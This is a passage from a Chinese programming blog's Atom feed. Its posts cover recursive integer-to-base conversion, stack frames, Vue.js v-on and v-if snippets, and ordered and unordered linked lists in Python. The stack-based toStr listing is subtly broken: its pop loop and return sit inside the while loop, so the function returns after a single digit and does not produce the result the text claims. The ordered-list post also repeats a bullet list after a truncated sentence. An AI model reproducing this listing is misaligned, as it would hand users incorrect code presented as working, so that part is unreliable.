的列表。</p><p>为了遵守第二定律，我们必须将算法向基本情况的状态改变。状态的改变意味着该算法正在使用的一些数据被修改。通常，表示问题的数据在某种程度上变小。在<code>listsum</code> 算法中，我们的主要数据结构是一个列表，因此我们必须将我们的状态转换工作集中在列表上。因为基本情况是长度 1 的列表，所以朝向基本情况的自然进展是缩短列表。在 Activecode 2 第五行，我们调用 <code>listsum</code> 生成一个较短的列表。</p><p>最后的法则是算法必须调用自身。这是递归的定义。递归对于许多新手程序员来说是一个混乱的概念。作为一个新手程序员，你已经知道函数是有益的，因为你可以将一个大问题分解成较小的问题。较小的问题可以通过编写一个函数来解决。我们用一个函数来解决问题，但该函数通过调用自己解决问题！该逻辑不是循环；递归的逻辑是通过将问题分解成更小个更容易的问题来解决的优雅表达。</p><p>在本章中的剩余部分，我们将讨论更多递归的例子。在每种情况下，我们将集中于使用递归的三个定律来设计问题的解决方案。</p><h3 id="整数转换为任意进制字符串"><a href="#整数转换为任意进制字符串" class="headerlink" title="整数转换为任意进制字符串"></a>整数转换为任意进制字符串</h3><p>假设你想将一个整数转换为一个二进制和十六进制字符串。例如，将整数<code>10</code> 转换为十进制字符串表示为 <code>10</code>，或将其字符串表示为二进制 <code>1010</code>。虽然有很多算法来解决这个问题，包括在栈部分讨论的算法，但递归的解决方法非常优雅。</p><p>让我们看一个十进制 <code>769</code> 的具体示例。假设我们有一个对应于前 <code>10</code> 位数的字符序列，例如 <code>convString =“0123456789”</code>。通过在序列中查找，很容易将小于 <code>10</code> 的数字转换为其等效的字符串。例如，如果数字为 <code>9</code> ，则字符串为 convString[9] 或 “9”。如果我们将数字 <code>769</code> 分成三个单个位数字，<code>7</code>，<code>6</code> 和 <code>9</code>，那么将其转换为字符串很简单。数字小于 10 听起来像一个好的基本情况。</p><p>知道我们的基本情况是什么意味着整个算法将分成三个部分：</p><ol><li>将原始数字减少为一系列单个位数字。</li><li>使用查找将单个位数字数字转换为字符串。</li><li>将单个位字符串连接在一起以形成最终结果。</li></ol><p>下一步是找到改变其状态的方法并向基本情况靠近。由于我们示例为整数，所以考虑什么数学运算可以减少一个数字。最可能的候选是除法和减法。虽然减法可能可以实现，但我们不清楚应该减去多少。使用余数的整数除法为我们提供了一个明确的方向。让我们看看如果我们将一个数字除以我们试图转换的基数，会发生什么。</p><p>使用整数除法将 <code>769</code> 除以 <code>10</code> ，我们得到 <code>76</code>，余数为 <code>9</code>。这给了我们两个好的结果。首先，余数是小于我们的基数的数字，可以通过查找立即转换为字符串。第二，我们得到的商小于原始数字，并让我们靠近具有小于基数的单个数字的基本情况。现在我们的工作是将 <code>76</code> 转换为其字符串表示。再次，我们使用商和余数分别获得 <code>7</code> 和 <code>6</code> 的结果。最后，我们将问题减少到转换 <code>7</code>，我们可以很容易地做到，因为它满足 <code>n &lt; base</code> 的基本条件，其中 <code>base = 10</code>。我们刚刚执行的一系列操作如 Figure 3 所示。请注意，余数位于图右侧框中。</p><p><img src="https://facert.gitbooks.io/python-data-structure-cn/4.%E9%80%92%E5%BD%92/4.5.%E6%95%B4%E6%95%B0%E8%BD%AC%E6%8D%A2%E4%B8%BA%E4%BB%BB%E6%84%8F%E8%BF%9B%E5%88%B6%E5%AD%97%E7%AC%A6%E4%B8%B2/assets/4.5.%E6%95%B4%E6%95%B0%E8%BD%AC%E6%8D%A2%E4%B8%BA%E4%BB%BB%E6%84%8F%E8%BF%9B%E5%88%B6%E5%AD%97%E7%AC%A6%E4%B8%B2.figure3.png" alt="image"></p><p><em>Figure 3</em></p><p>ActiveCode 1 展示了实现上述算法的 Python 代码， 以 2 到 16 之间的任何基数为参数。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">toStr</span><span class="params">(n,base)</span>:</span></div><div class="line">   convertString = <span class="string">"0123456789ABCDEF"</span></div><div class="line">   <span class="keyword">if</span> n &lt; base:</div><div class="line">      <span class="keyword">return</span> convertString[n]</div><div class="line">   <span class="keyword">else</span>:</div><div class="line">      <span class="keyword">return</span> toStr(n//base,base) + convertString[n%base]</div><div class="line"></div><div class="line">print(toStr(<span class="number">1453</span>,<span class="number">16</span>))</div></pre></td></tr></table></figure><p>请注意，在第3行中，我们检查基本情况，其中n小于我们要转换的基数。让我们检测到基本情况时，我们停止递归，并简单地从convertString序列返回字符串。在第6行中，我们满足第三和第二定律-递归调用和减少除法问题大小。</p><p>让我们再次跟踪算法；这次我们将数字10将转换为其基数为2的字符串（“1010”）。</p><p><img src="https://facert.gitbooks.io/python-data-structure-cn/4.%E9%80%92%E5%BD%92/4.5.%E6%95%B4%E6%95%B0%E8%BD%AC%E6%8D%A2%E4%B8%BA%E4%BB%BB%E6%84%8F%E8%BF%9B%E5%88%B6%E5%AD%97%E7%AC%A6%E4%B8%B2/assets/4.5.%E6%95%B4%E6%95%B0%E8%BD%AC%E6%8D%A2%E4%B8%BA%E4%BB%BB%E6%84%8F%E8%BF%9B%E5%88%B6%E5%AD%97%E7%AC%A6%E4%B8%B2.figure4.png" alt="image"></p><p><em>Figure 4</em></p><p>Figure 4 显示我们得到的结果，但看起来数字是错误的顺序。该算法是正确的，因为我们首先在第 6 行进行递归调用，然后我们添加余数的字符串形式。 如果我们反向返回 convertString 查找并返回 toStr 调用，则生成的字符串将是反向的！通过延后连接操作直到递归调用返回，我们可以得到正确顺序的结果。这应该能使你想起你在上一章中讨论的栈。</p><h3 id="栈帧：实现递归"><a href="#栈帧：实现递归" class="headerlink" title="栈帧：实现递归"></a>栈帧：实现递归</h3><p>假设不是将递归调用的结果与来自 convertString 的字符串拼接到 toStr，我们修改了算法，以便在进行递归调用之前将字符串入栈。此修改的算法的代码展示在 ActiveCode 1 中。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">from</span> pythonds.basic.stack <span class="keyword">import</span> Stack</div><div class="line">rStack=Stack()</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">toStr</span><span class="params">(n,base)</span>:</span></div><div class="line">    convertString=<span class="string">"0123456789ABCDEF"</span></div><div class="line">    <span class="keyword">while</span> n&gt;<span class="number">0</span>:</div><div class="line">        <span class="keyword">if</span> n&lt;base:</div><div class="line">            rStack.push(convertString[n])</div><div class="line">        <span class="keyword">else</span>:</div><div class="line">            rStack.push(convertString[n%base])</div><div class="line">        n=n//base</div><div class="line">        res=<span class="string">""</span></div><div class="line">        <span class="keyword">while</span> <span class="keyword">not</span> rStack.isEmpty():</div><div class="line">            res=res+str(rStack.pop())</div><div class="line">        <span class="keyword">return</span> res</div><div class="line">print(toStr(<span class="number">1453</span>,<span class="number">16</span>))</div></pre></td></tr></table></figure><p>其实不需要对n是否小于base进行判断，因为当n小于base时返回的字符串与n大于base时返回的字符串没区别。</p><p><em>ActiveCode 1</em></p><p>每次我们调用 toStr，我们在栈上推入一个字符。回到前面的例子，我们可以看到在第四次调用 toStr 之后，栈看起来像 Figure 5 。注意，现在我们可以简单地将字符从栈中弹出，并将它们连接成最终结果 “1010”。</p><p><img src="https://facert.gitbooks.io/python-data-structure-cn/4.%E9%80%92%E5%BD%92/4.6.%E6%A0%88%E5%B8%A7%EF%BC%9A%E5%AE%9E%E7%8E%B0%E9%80%92%E5%BD%92/assets/4.6.%E6%A0%88%E5%B8%A7%EF%BC%9A%E5%AE%9E%E7%8E%B0%E9%80%92%E5%BD%92.figure5.png" alt="image"></p><p><em>Figure 5</em></p><p>前面的例子让我们了解了 Python 如何实现一个递归函数调用。 当在 Python 中调用函数时，会分配一个栈来处理函数的局部变量。当函数返回时，返回值留在栈的顶部，以供调用函数访问。 Figure 6 说明了第 4 行返回语句后的调用栈。</p><p><img src="https://facert.gitbooks.io/python-data-structure-cn/4.%E9%80%92%E5%BD%92/4.6.%E6%A0%88%E5%B8%A7%EF%BC%9A%E5%AE%9E%E7%8E%B0%E9%80%92%E5%BD%92/assets/4.6.%E6%A0%88%E5%B8%A7%EF%BC%9A%E5%AE%9E%E7%8E%B0%E9%80%92%E5%BD%92.figure6.png" alt="image"></p><p><em>Figure 6</em></p><p>注意，对 <code>toStr(2//2,2)</code> 的调用在栈上返回值为 “1”。 然后，在表达式 <code>“1” + convertString[2％2]</code>中使用此返回值替换函数调用<code>(toStr(1,2))</code>，这将在栈顶部留下字符串 “10”。 这样，Python 调用栈就代替了我们在 Listing 4 中明确使用的栈。在我们的列表求和示例中，你可以认为栈上的返回值取代了累加器变量。</p><p>栈帧还为函数使用的变量提供了一个作用域。 即使我们重复地调用相同的函数，每次调用都会为函数本地的变量创建一个新的作用域。</p>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;计算整数列表和&quot;&gt;&lt;a href=&quot;#计算整数列表和&quot; class=&quot;headerlink&quot; title=&quot;计算整数列表和&quot;&gt;&lt;/a&gt;计算整数列表和&lt;/h1&gt;&lt;p&gt;我们将以一个简单的问题开始，你已经知道如何不使用递归解决。 假设你想计算整数列表的总和，例如：&lt;code&gt;[1,3,5,7,9]&lt;/code&gt;。 计算总和的迭代函数见ActiveCode 1。函数使用累加器变量（&lt;code&gt;theSum&lt;/code&gt;）来计算列表中所有整数的和，从 0 开始，加上列表中的每个数字。
    
    </summary>
    
      <category term="Python" scheme="http://adamzeng.site/categories/Python/"/>
    
    
      <category term="Python" scheme="http://adamzeng.site/tags/Python/"/>
    
  </entry>
  
  <entry>
    <title>Vue.js的数据</title>
    <link href="http://adamzeng.site/2017/11/02/Vue-js%E7%9A%84%E6%95%B0%E6%8D%AE/"/>
    <id>http://adamzeng.site/2017/11/02/Vue-js的数据/</id>
    <published>2017-11-02T14:08:40.000Z</published>
    <updated>2017-11-02T15:38:13.000Z</updated>
    
    <content type="html"><![CDATA[<p>v-on click:点击某个地方，让数据发生变动。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">v-on:click</span>=<span class="string">"doSomething"</span>&gt;</span><span class="tag">&lt;/<span class="name">a</span>&gt;</span></div></pre></td></tr></table></figure><p>使用v-if,v-else实现屏蔽</p><figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"comment"</span> <span class="attr">v-if</span>=<span class="string">"false"</span>&gt;</span></div><div class="line">  </div><div class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></div><div class="line"></div><div class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">v-else</span> <span class="attr">class</span>=<span class="string">"comment"</span>&gt;</span></div><div class="line">  </div><div class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></div></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;v-on click:点击某个地方，让数据发生变动。&lt;/p&gt;
&lt;figure class=&quot;highlight html&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td 
      
    
    </summary>
    
      <category term="Vue.js" scheme="http://adamzeng.site/categories/Vue-js/"/>
    
    
      <category term="Vue.js" scheme="http://adamzeng.site/tags/Vue-js/"/>
    
  </entry>
  
  <entry>
    <title>有序列表</title>
    <link href="http://adamzeng.site/2017/10/30/%E6%9C%89%E5%BA%8F%E5%88%97%E8%A1%A8/"/>
    <id>http://adamzeng.site/2017/10/30/有序列表/</id>
    <published>2017-10-30T14:15:17.000Z</published>
    <updated>2017-10-30T14:52:32.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="有序列表抽象数据结构"><a href="#有序列表抽象数据结构" class="headerlink" title="有序列表抽象数据结构"></a>有序列表抽象数据结构</h1><p>我们现在将考虑一种称为有序列表的列表类型。例如，如果上面所示的整数列表是有序列表（升序），则它可以写为<code>17,26,31,54,77和93</code>。由于17是最小项，它占据第一位置。同样，由于93是最大的，它占据最后的位置。<a id="more"></a></p><p>有序列表的结构是项的集合，其中每个项保存基于项的一些潜在特性的相对位置。排序通常是升序或降序，并且我们假设列表项具有已经定义的有意义的比较运算。许多有序列表操作与无序列表的操作相同。</p><ul><li>OrderedList() 创建一个新的空列表。它不需要参数，并返回一个空列表。</li><li>add(item) 向列表中添加一个新项。它需要 item 作为参数，并不返回任何内容。假定该 item 不在列表中。</li><li>remove(item) 从列表中删除该项。它需要 item 作为参数并修改列表。假设项存在于列表中。</li><li>search(item) 搜索列表中的项目。它需要 item 作为参数，并返回一个布尔值。</li><li>isEmpty() 检查列表是否为空。它不需要参数，并返回布尔值。</li><li>size（）返回列表中的项数。它不需要参数，并返回一个整数。</li><li>index(item) 返回项在列表中的位置。它需要 item 作为参数并返回索引。假定该项在列表中。</li><li>pop() 删除并返回列表中的最后一个项。假设该列表至少有一个项。</li><li>pop(pos) 删除并返回位置 pos 处的项。它需要 pos 作为参数并返回项。假定该项在列表中。</li></ul><p>为了实现有序列表，我们必须记住项的相对位置是基于一些潜在的特性。上面给出的整数的有序列表</p><ul><li>OrderedList() 创建一个新的空列表。它不需要参数，并返回一个空列表。</li><li>add(item) 向列表中添加一个新项。它需要 item 作为参数，并不返回任何内容。假定该 item 不在列表中。</li><li>remove(item) 从列表中删除该项。它需要 item 作为参数并修改列表。假设项存在于列表中。</li><li>search(item) 搜索列表中的项目。它需要 item 作为参数，并返回一个布尔值。</li><li>isEmpty() 检查列表是否为空。它不需要参数，并返回布尔值。</li><li>size（）返回列表中的项数。它不需要参数，并返回一个整数。</li><li>index(item) 返回项在列表中的位置。它需要 item 作为参数并返回索引。假定该项在列表中。</li><li>pop() 删除并返回列表中的最后一个项。假设该列表至少有一个项。</li><li>pop(pos) 删除并返回位置 pos 处的项。它需要 pos 作为参数并返回项。假定该项在列表中。</li></ul><h1 id="实现有序列表"><a href="#实现有序列表" class="headerlink" title="实现有序列表"></a>实现有序列表</h1><p>为了实现有序列表，我们必须记住项的相对位置是基于一些潜在的特性。上面给出的整数的有序列表<code>17,26,31,54,77</code> 和 <code>93</code> 可以由 Figure 15 所示的链接结构表示。节点和链接结构表示项的相对位置。</p><p><img src="https://facert.gitbooks.io/python-data-structure-cn/3.%E5%9F%BA%E6%9C%AC%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/3.23.%E5%AE%9E%E7%8E%B0%E6%9C%89%E5%BA%8F%E5%88%97%E8%A1%A8/assets/3.23.%E5%AE%9E%E7%8E%B0%E6%9C%89%E5%BA%8F%E5%88%97%E8%A1%A8.figure15.png" alt="image"></p><p><em>Figure 15</em></p><p>为了实现OrderedList类，我们将使用与前面看到的无序列表相同的技术。再次，head的引用为None表示空链表。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">OrderedList</span>:</span></div><div class="line">  <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self)</span>:</span></div><div class="line">    self.head=<span class="keyword">None</span></div></pre></td></tr></table></figure><p><em>Listing 8</em></p><p>当我们考虑有序列表的操作时，我们应该注意，<code>isEmpty</code> 和<code>size</code> 方法可以与无序列表一样实现，因为它们只处理链表中的节点数量，而不考虑实际项值。同样，<code>remove</code> 方法将正常工作，因为我们仍然需要找到该项，然后删除它。剩下的两个方法，<code>search</code> 和 <code>add</code>，将需要一些修改。</p><p>搜索无序列表需要我们一次遍历一个节点，直到找到我们正在寻找的节点或者没找到节点（None）。事实证明，相同的方法在有序列表也有效。然而，在项不在链表中的情况下，我们可以利用该顺序来尽快停止搜索。</p><p>例如，Figure 16 展示了有序链表搜索值 45 。从链表的头部开始遍历，首先与 <code>17</code> 进行比较。由于 <code>17</code> 不是我们正在寻找的项，移动到下一个节点 <code>26</code> 。再次，这不是我们想要的，继续到 <code>31</code>，然后再到 <code>54</code>。在这一点上，有一些不同。由于 <code>54</code> 不是我们正在寻找的项，我们以前的方法是继续向前迭代。然而，由于这是有序列表，一旦节点中的值变得大于我们正在搜索的项，搜索就可以停止并返回 False 。该项不可能存在于后面的链表中。 </p><p><img src="https://facert.gitbooks.io/python-data-structure-cn/3.%E5%9F%BA%E6%9C%AC%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/3.23.%E5%AE%9E%E7%8E%B0%E6%9C%89%E5%BA%8F%E5%88%97%E8%A1%A8/assets/3.23.%E5%AE%9E%E7%8E%B0%E6%9C%89%E5%BA%8F%E5%88%97%E8%A1%A8.figure16.png" alt="image"></p><p><em>Figure 16</em></p><p>Listing 9 展示了完整的搜索方法。通过添加另一个布尔变量 <code>stop</code> 并将其初始化为 <code>False</code>（第4行），很容易合并上述新条件。 当 <code>stop</code> 是<code>False</code>（不停止）时，我们可以继续在列表中前进（第5行）。如果发现任何节点包含大于我们正在寻找的项的数据，我们将 <code>stop</code> 设置为 <code>True</code>（第9-10行）。其余行与无序列表搜索相同。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div></pre></td><td class="code"><pre><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">OrderedList</span>:</span></div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self)</span>:</span></div><div class="line">        self.head=<span class="keyword">None</span></div><div class="line">        </div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">search</span><span class="params">(self,item)</span>:</span></div><div class="line">        current=self.head</div><div class="line">        found=<span class="keyword">False</span></div><div class="line">        stop=<span class="keyword">False</span></div><div class="line">        <span class="keyword">while</span> current!=<span class="keyword">None</span> <span class="keyword">and</span> <span class="keyword">not</span> found <span class="keyword">and</span> <span class="keyword">not</span> stop:</div><div class="line">            <span class="keyword">if</span> current.getData()==item:</div><div class="line">                found=<span class="keyword">True</span></div><div class="line">            <span class="keyword">else</span>:</div><div class="line">                <span class="keyword">if</span> current.getData()&gt;item:</div><div class="line">                    stop=<span class="keyword">True</span></div><div class="line">                <span class="keyword">else</span>:</div><div class="line">                    current=current.getNext()</div><div class="line">                    </div><div class="line">        <span class="keyword">return</span> found</div></pre></td></tr></table></figure><p><em>Listing 9</em></p><p>最重要的需要修改的方法是add。回想一下，对于无序列表，add方法可以简单地将新节点放在链表的头部。这是最简单的访问点。不幸的是，这将不再适用于有序列表。需要在现在的有序列表中查找新项所属的特定位置。</p><p>假设我们有由假设我们有由 <code>17,26,54,77</code> 和 <code>93</code> 组成的有序列表，并且我们要添加值<code>31</code> 。 <code>add</code> 方法必须确定新项属于 <code>26</code> 到 <code>54</code> 之间。Figure 17 展示了我们需要的设置。正如我们前面解释的，我们需要遍历链表，寻找添加新节点的地方。我们知道，当我们迭代完节点（ <code>current</code> 变为 None）或 <code>current</code> 节点的值变得大于我们希望添加的项时，我们就找到了该位置。在我们的例子中，看到值 <code>54</code> 我们停止迭代。</p><p><img src="https://facert.gitbooks.io/python-data-structure-cn/3.%E5%9F%BA%E6%9C%AC%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/3.23.%E5%AE%9E%E7%8E%B0%E6%9C%89%E5%BA%8F%E5%88%97%E8%A1%A8/assets/3.23.%E5%AE%9E%E7%8E%B0%E6%9C%89%E5%BA%8F%E5%88%97%E8%A1%A8.figure17.png" alt="image"></p><p><em>Figure 17</em></p><p>正如我们看到的无序列表，有必要有一个额外的引用，再次称为 <code>previous</code>，因为 <code>current</code> 不会提供对修改的节点的访问。 Listing 10 展示了完整的<code>add</code> 方法。 行 2-3 设置两个外部引用，行 9-10 允许 <code>previous</code> 每次通过迭代跟随 <code>current</code> 节点后面 。 条件（行5）允许迭代继续，只要有更多的节点，并且当前节点中的值不大于该项。 在任一种情况下，当迭代失败时，我们找到了新节点的位置。</p><p>该方法的其余部分完成 Figure17 所示的两步过程。一旦为该项创建了新节点，剩下的唯一问题是新节点是否将被添加在链表的开始处或某个中间位置。再次，<code>previous == None</code>（第13行）可以用来提供答案。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(self,item)</span>:</span></div><div class="line">    current=self.head</div><div class="line">    previous=<span class="keyword">None</span></div><div class="line">    stop=<span class="keyword">False</span></div><div class="line">    <span class="keyword">while</span> current!=<span class="keyword">None</span> <span class="keyword">and</span> <span class="keyword">not</span> stop:</div><div class="line">        <span class="keyword">if</span> current.getData()&gt;item:</div><div class="line">            stop=<span class="keyword">True</span></div><div class="line">        <span class="keyword">else</span>:</div><div class="line">            previous=current</div><div class="line">            current=current.getNext()</div><div class="line"></div><div class="line">    temp=Node(item)</div><div class="line">    <span class="keyword">if</span> previous==<span class="keyword">None</span>:</div><div class="line">        temp.setNext(self.head)</div><div class="line">        self.head=temp</div><div class="line">    <span class="keyword">else</span>:</div><div class="line">        temp.setNext(current)</div><div class="line">        previous.setNext(temp)</div></pre></td></tr></table></figure><p><em>Listing 10</em></p><h3 id="3-23-1-链表分析"><a href="#3-23-1-链表分析" class="headerlink" title="3.23.1.链表分析"></a>3.23.1.链表分析</h3><p>为了分析链表操作的复杂性，我们需要考虑它们是否需要遍历。考虑具有 n 个节点的链表。 <code>isEmpty</code> 方法是 O(1)，因为它需要一个步骤来检查头的引用为 <code>None</code>。另一方面，<code>size</code> 将总是需要 n 个步骤，因为不从头到尾地移动没法知道有多少节点在链表中。因此，长度为 O(n)。将项添加到无序列表始终是O(1)，因为我们只是将新节点放置在链表的头部。但是，搜索和删除，以及添加有序列表，都需要遍历过程。虽然平均他们可能只需要遍历节点的一半，这些方法都是 O(n)，因为在最坏的情况下，都将处理列表中的每个节点。</p><p>你可能还注意到此实现的性能与早前针对 Python 列表给出的实际性能不同。这表明链表不是 Python 列表的实现方式。 Python 列表的实际实现基于数组的概念。我们在第 8 章中更详细地讨论这个问题。</p>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;有序列表抽象数据结构&quot;&gt;&lt;a href=&quot;#有序列表抽象数据结构&quot; class=&quot;headerlink&quot; title=&quot;有序列表抽象数据结构&quot;&gt;&lt;/a&gt;有序列表抽象数据结构&lt;/h1&gt;&lt;p&gt;我们现在将考虑一种称为有序列表的列表类型。例如，如果上面所示的整数列表是有序列表（升序），则它可以写为&lt;code&gt;17,26,31,54,77和93&lt;/code&gt;。由于17是最小项，它占据第一位置。同样，由于93是最大的，它占据最后的位置。
    
    </summary>
    
      <category term="Python" scheme="http://adamzeng.site/categories/Python/"/>
    
    
      <category term="Python" scheme="http://adamzeng.site/tags/Python/"/>
    
  </entry>
  
  <entry>
    <title>列表</title>
    <link href="http://adamzeng.site/2017/10/30/%E5%88%97%E8%A1%A8/"/>
    <id>http://adamzeng.site/2017/10/30/列表/</id>
    <published>2017-10-30T02:18:07.000Z</published>
    <updated>2017-10-30T14:12:58.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="列表"><a href="#列表" class="headerlink" title="列表"></a>列表</h1><p>在对基本数据结构的讨论中，我们使用Python列表来实现所呈现的抽象数据类型。列表是一个强大但简单的收集机制，为程序员提供了各种各样的操作。然而，不是所有的编程语言都包括列表集合、在这些情况下，列表的概念必须由程序员实现。<a id="more"></a></p><p>列表是项的集合，其中每个项保持相对其他项的相对位置。更具体地，我们将这种类型的列表称为无序列表。我们可以将列表视为具有第一项，第二项，第三项等等。我们还可以引用列表的开头（第一个项）或列表的结尾）最后一个项）。为了简单起见，我们假设列表不能包含重复项。</p><p>例如，整数54，26，93，17，77和31的集合可以表示分数的简单无序列表。请注意，我们将它们用逗号分隔，这是列表结构的常用方式。当然，Python会显示这个列表为[54,26,93,17,77,31]。</p><h1 id="实现无序列表抽象数据类型"><a href="#实现无序列表抽象数据类型" class="headerlink" title="实现无序列表抽象数据类型"></a>实现无序列表抽象数据类型</h1><p>如上所述，无序列表的结构是项的集合，其中每个项保持相对于其他项的相对位置。下面给出了一些可能的无序列表操作。</p><ul><li>List()创建一个新的空列表。他不需要参数，并返回一个空列表。</li><li>add(item)向列表中添加一个新项。它需要item作为参数，并不返回任何内容。假定该item不在列表中。</li><li>remove(item)从列表中删除该项。它需要 item 作为参数并修改列表。假设项存在于列表中。</li><li>search(item) 搜索列表中的项目。它需要 item 作为参数，并返回一个布尔值。</li><li>isEmpty() 检查列表是否为空。它不需要参数，并返回布尔值。</li><li>size（）返回列表中的项数。它不需要参数，并返回一个整数。</li><li>append(item) 将一个新项添加到列表的末尾，使其成为集合中的最后一项。它需要 item 作为参数，并不返回任何内容。假定该项不在列表中。</li><li>index(item) 返回项在列表中的位置。它需要 item 作为参数并返回索引。假定该项在列表中。</li><li>insert(pos，item) 在位置 pos 处向列表中添加一个新项。它需要 item 作为参数并不返回任何内容。假设该项不在列表中，并且有足够的现有项使其有 pos 的位置。</li><li>pop() 删除并返回列表中的最后一个项。假设该列表至少有一个项。</li><li>pop(pos) 删除并返回位置 pos 处的项。它需要 pos 作为参数并返回项。假定该项在列表中。</li></ul><h1 id="实现无序列表：链表"><a href="#实现无序列表：链表" class="headerlink" title="实现无序列表：链表"></a>实现无序列表：链表</h1><p>为了实现无序列表，我们将构造通常所知的链表。回想一下，我们需要确保我们可以保持项的相对定位。然而，没有要求我们维持在连续存储器中的定位。例如，考虑Figure 1中所示的项的集合。看来这些值已被随机放置。如果我们可以在每个项中保持一些明确的信息，即下一个项的位置(参见Figure 2)，则每个项的相对位置可以通过简单地从一个项到下一个项的链接来表示。</p><p><img src="https://facert.gitbooks.io/python-data-structure-cn/3.%E5%9F%BA%E6%9C%AC%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/3.21.%E5%AE%9E%E7%8E%B0%E6%97%A0%E5%BA%8F%E5%88%97%E8%A1%A8%EF%BC%9A%E9%93%BE%E8%A1%A8/assets/3.21.%E5%AE%9E%E7%8E%B0%E6%97%A0%E5%BA%8F%E5%88%97%E8%A1%A8%EF%BC%9A%E9%93%BE%E8%A1%A8.figure1.png" alt="image"></p><p><em>Figure 1</em></p><p><img src="https://facert.gitbooks.io/python-data-structure-cn/3.%E5%9F%BA%E6%9C%AC%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/3.21.%E5%AE%9E%E7%8E%B0%E6%97%A0%E5%BA%8F%E5%88%97%E8%A1%A8%EF%BC%9A%E9%93%BE%E8%A1%A8/assets/3.21.%E5%AE%9E%E7%8E%B0%E6%97%A0%E5%BA%8F%E5%88%97%E8%A1%A8%EF%BC%9A%E9%93%BE%E8%A1%A8.figure2.png" alt="image"></p><p><em>Figure 2</em></p><p>要注意，必须明确地指定链表的第一项的位置。一旦我们知道第一个项在哪里，第一个项目可以告诉我们第二个是什么，等等。外部引用通常被称为链表的头。类似地，最后一个项需要知道没有下一个项。</p><h3 id="Node类"><a href="#Node类" class="headerlink" title="Node类"></a>Node类</h3><p>链表实现的基本构造块是节点。每个节点对象必须至少保存两个信息。首先，节点必须包含列表项本身。我们将这个称为节点的数据字段。此外，每个节点必须保存对下一个节点的引用。Listing 1展示了Python实现。要构造一个节点，需要提供该节点的初始数据值。下面的赋值语句将产生一个包含值93的节点对象(见Figure 3)。应该注意，我们通常会如Figure 4 所示表示一个节点对象。Node类还包括访问，修改数据和访问下一个引用的常用方法。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div></pre></td><td class="code"><pre><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">Node</span>:</span></div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self,initdata)</span>:</span></div><div class="line">        self.data=initdata</div><div class="line">        self.next=<span class="keyword">None</span></div><div class="line"></div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">getData</span><span class="params">(self)</span>:</span></div><div class="line">        <span class="keyword">return</span> self.data</div><div class="line"></div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">getNext</span><span class="params">(self)</span>:</span></div><div class="line">        <span class="keyword">return</span> self.next</div><div class="line"></div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">setData</span><span class="params">(self,newdata)</span>:</span></div><div class="line">        <span 